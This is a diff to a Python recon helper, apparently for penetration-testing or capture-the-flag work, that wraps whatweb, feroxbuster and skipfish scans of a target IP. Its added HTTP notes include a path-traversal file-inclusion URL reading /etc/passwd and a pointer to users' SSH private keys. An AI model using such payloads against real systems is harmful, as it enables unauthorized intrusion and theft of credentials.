@@ -11,29 +11,27 @@ HTTP Notes:
   - Check for hidden directories
   - Check for hidden files
   - Check versions
+  - http://<TARGET_MACHINE_IP>/doctor-item.php?include=/../../../../../../../../../../../../../../../../etc/passwd
+  - look for /home/<NAME>/.ssh/id_rsa
 """
     run_command(title, content, target_ip, open_ports)
 
 
-def whatweb(target_ip, open_ports):
+def whatweb(target_ip, open_ports):  # 1st, -
+    category = "http"
+    run_automatic = True
     title = "WhatWeb"
     content = f"whatweb -a3 http://{target_ip} -v"
     run_command(title, content, target_ip, open_ports)
 
-
-def robots(target_ip, open_ports):
-    title = "Robots.txt"
-    content = f"wget http://{target_ip}/robots.txt"
-    run_command(title, content, target_ip, open_ports)
     
-    
-def feroxbuster(target_ip, open_ports):
+def feroxbuster(target_ip, open_ports):  # -,1st
     title = "Feroxbuster"
     content = f"feroxbuster -u http://{target_ip} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 --silent"
     run_command(title, content, target_ip, open_ports)
     
     
-def skipfish(target_ip, open_ports):
+def skipfish(target_ip, open_ports): # -, 2nd
     category = "http"
     title = "Skipfish"
     content = f"skipfish -k 00:06:00 -o doctorScan/ http://{target_ip}/"
